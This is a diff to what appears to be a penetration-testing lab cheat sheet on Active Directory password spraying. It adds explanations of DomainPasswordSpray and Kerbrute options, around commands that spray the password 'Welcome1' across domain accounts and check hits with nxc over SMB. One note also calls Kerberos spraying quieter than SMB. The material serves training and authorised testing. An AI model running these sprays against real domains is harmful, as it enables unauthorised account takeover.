@@ -19,6 +19,7 @@ cat spray_success
 # STEP 4 — Validate hit from Linux
 nxc smb DC_IP -u HIT_USER -p 'Welcome1'
 ```
+> `DomainPasswordSpray` automatically builds the user list from Active Directory (AD), queries the lockout policy, and excludes accounts near the threshold. `-OutFile` saves successful credential pairs to a file. `-ErrorAction SilentlyContinue` hides noisy error messages. Validate any hit from your Linux host before trusting it.
 
 ---
 
@@ -33,6 +34,7 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 # Not domain-joined (provide user list)
 Invoke-DomainPasswordSpray -UserList valid_users.txt -Password Welcome1 -OutFile spray_success
 ```
+> If running on a domain-joined host, the tool builds the user list automatically. If not domain-joined, pass `-UserList` with your own file. Always use `-OutFile` — results scroll off screen quickly.
 
 Always use `-OutFile` — don't rely on scrolling console.
 
@@ -43,6 +45,7 @@ Always use `-OutFile` — don't rely on scrolling console.
 ```powershell
 .\kerbrute.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
 ```
+> Windows version of Kerbrute. Same syntax as Linux. Sprays one password against all usernames in the file using the Kerberos protocol. Quieter than SMB-based spraying.
 
 ---
 
